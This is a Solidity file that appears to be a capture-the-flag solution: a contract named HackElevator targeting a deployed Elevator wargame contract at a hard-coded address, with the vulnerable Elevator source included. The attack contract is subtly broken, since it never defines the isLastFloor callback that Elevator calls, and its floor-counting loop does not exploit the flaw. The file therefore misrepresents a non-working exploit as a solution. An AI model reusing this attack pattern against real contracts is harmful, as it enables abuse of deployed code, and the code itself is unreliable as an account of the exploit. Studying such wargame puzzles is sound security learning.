// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

import './Elevator.sol';

contract HackElevator {
  Elevator public originalContract = Elevator(0x9053035BFd8b391CD30a9246d175E659AE518d31); 

  uint public lastFloor;
  uint public counter = 0;

  function hackThis() public {
    do {
      counter += 1;
      originalContract.goTo(counter);
    } while (originalContract.top() == false);
    lastFloor = counter;
  }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10; // Latest solidity version

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}